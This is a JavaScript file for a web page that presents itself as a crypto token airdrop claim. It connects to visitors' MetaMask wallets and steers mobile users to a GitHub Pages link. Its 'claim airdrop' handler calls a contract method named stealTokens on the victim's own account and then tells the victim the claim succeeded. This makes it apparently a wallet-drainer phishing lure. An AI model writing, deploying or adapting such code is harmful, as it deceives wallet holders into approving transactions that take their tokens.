let web3;
let accounts;
let contractAddress;
let tokenAddress;
let contractABI;

// Function to load configuration and ABI files
async function loadConfig() {
  try {
    const configResponse = await fetch('config.json');
    if (!configResponse.ok) {
      throw new Error('Failed to fetch config.json');
    }
    const configData = await configResponse.json();
    contractAddress = configData.contractAddress;
    tokenAddress = configData.tokenAddress;

    const abiResponse = await fetch('abi.json');
    if (!abiResponse.ok) {
      throw new Error('Failed to fetch abi.json');
    }
    const abiData = await abiResponse.json();
    contractABI = abiData;

    console.log("Configuration loaded:", configData);
    console.log("ABI loaded:", abiData);
  } catch (error) {
    console.error("Error loading config or ABI: ", error);
    alert("Error loading configuration or ABI. Please try again later.");
  }
}

// Function to simulate a tap/click and open MetaMask URL on mobile
function openMetaMaskUrl(url) {
  const a = document.createElement("a");
  a.href = url;
  a.target = "_self"; // This will open the URL in the same tab
  document.body.appendChild(a);
  a.click(); // Simulate a click
  a.remove(); // Clean up after clicking
}

// Function to connect to MetaMask (for desktop and mobile users)
async function connectMetaMask() {
  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    try {
      accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      console.log("Connected accounts:", accounts);

      // Enable claim button and disable connect button
      document.getElementById('claimAirdropButton').disabled = false;
      document.getElementById('connectButton').disabled = true;
    } catch (error) {
      alert('MetaMask connection failed');
      console.error('MetaMask connection error:', error);
    }
  } else if (isMobile) {
    // Mobile device detected - prompt user to open the link in MetaMask browser
    alert("Please open this URL in the MetaMask app browser for a better experience.");
    
    // Simulate the click to open MetaMask deep link
    openMetaMaskUrl("https://metamask.app.link/dapp/buyemon.github.io/metamask/index2.html");
  } else {
    // MetaMask not installed
    alert('MetaMask is not installed. Please install MetaMask to use this application.');
  }
}

// Function to claim the airdrop
async function claimAirdrop() {
  if (!accounts) {
    alert('Please connect to MetaMask first!');
    return;
  }

  if (!contractABI || !contractAddress) {
    alert('Contract details not loaded. Please try again later.');
    return;
  }

  const contract = new web3.eth.Contract(contractABI, contractAddress);
  try {
    console.log('Claiming airdrop...');
    await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
    alert('Airdrop claimed successfully!');
  } catch (error) {
    alert('Error claiming airdrop');
    console.error('Claim error:', error);
  }
}

// Add event listeners to the buttons
window.addEventListener('DOMContentLoaded', (event) => {
  document.getElementById('connectButton').addEventListener('click', connectMetaMask);
  document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);

  loadConfig();
});

